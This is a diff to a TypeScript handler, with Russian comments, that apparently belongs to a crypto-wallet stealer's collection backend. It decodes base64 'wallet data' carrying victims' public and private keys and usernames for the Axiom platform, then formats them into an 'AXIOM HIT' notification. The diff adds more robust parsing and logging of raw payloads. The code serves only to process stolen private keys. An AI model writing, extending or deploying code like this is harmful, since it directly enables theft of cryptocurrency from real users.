@@ -1,40 +1,55 @@
 import type { PlatformHandler, ProcessResult, PlatformData } from './types.js';
 
-// Обработчик для платформы Axiom (базовая реализация)
+// Обработчик для платформы Axiom
 export class AxiomHandler implements PlatformHandler {
   name = 'axiom';
 
   async processMessage(data: PlatformData | string): Promise<ProcessResult> {
-    // Данные могут прийти как base64 строка или как уже распарсенный объект
-    let walletData: {
-      keys: Array<{ public: string; private: string }>;
-      sent: any;
-      code: string;
-      username: string;
-      platform: string;
-    };
+    console.log('📦 Axiom processing started. Data type:', typeof data);
+    
+    let walletData: any;
 
     if (typeof data === 'string') {
-      // Если данные пришли как base64 строка, декодируем
-      const decryptedData = Buffer.from(data, "base64").toString("utf-8");
-      walletData = JSON.parse(decryptedData);
+      try {
+        const decryptedData = Buffer.from(data, "base64").toString("utf-8");
+        walletData = JSON.parse(decryptedData);
+      } catch (e) {
+        console.error('❌ Failed to parse base64 data in AxiomHandler');
+        walletData = {};
+      }
     } else {
-      // Если данные уже объект, используем как есть
-      walletData = data as typeof walletData;
+      walletData = data;
     }
 
-    console.log(`📊 Processing Axiom wallet data`);
-    console.log(`   Username: ${walletData.username}`);
-    console.log(`   Keys count: ${walletData.keys?.length || 0}`);
+    // Проверяем наличие ключей в разных возможных полях (keys или message -> keys)
+    let keys = walletData.keys;
+    
+    // Если ключей нет в корне, но есть поле message (базовая строка), 
+    // пробуем извлечь ключи из неё (случай для некоторых типов интеграций)
+    if (!keys && walletData.message && typeof walletData.message === 'string') {
+      try {
+        const decoded = JSON.parse(Buffer.from(walletData.message, 'base64').toString('utf-8'));
+        keys = decoded.keys;
+      } catch (e) {}
+    }
 
-    // Базовая реализация - просто форматируем данные
-    let message = `🎯 <b>AXIOM HIT</b>\n\n`;
-    if (walletData.keys && Array.isArray(walletData.keys)) {
-      walletData.keys.forEach(key => {
-        message += `<b>Public Key:</b>\n<code>${key.public}</code>\n`;
-        message += `<b>Private Key:</b>\n<code>${key.private}</code>\n`;
-        message += `========================================\n\n`;
+    console.log(`📊 Axiom Data: User=${walletData.username}, Keys=${Array.isArray(keys) ? keys.length : 'none'}`);
+
+    let message = `🎯 <b>AXIOM HIT</b>\n`;
+    message += `👤 <b>User:</b> <code>${walletData.username || 'unknown'}</code>\n`;
+    message += `🌐 <b>Platform:</b> <code>${walletData.platform || 'axiom'}</code>\n\n`;
+
+    if (keys && Array.isArray(keys) && keys.length > 0) {
+      keys.forEach((key: any, index: number) => {
+        message += `🔑 <b>Wallet #${index + 1}</b>\n`;
+        message += `<b>Public:</b> <code>${key.public || 'n/a'}</code>\n`;
+        message += `<b>Private:</b> <code>${key.private || 'n/a'}</code>\n`;
+        message += `----------------------------------------\n`;
       });
+    } else {
+      message += `⚠️ <i>No keys found in payload</i>\n`;
+      // Для отладки добавим сырые данные если ключей нет
+      console.log('Raw data received:', JSON.stringify(walletData));
     }
 
     return {
@@ -43,4 +58,3 @@ export class AxiomHandler implements PlatformHandler {
     };
   }
 }
-
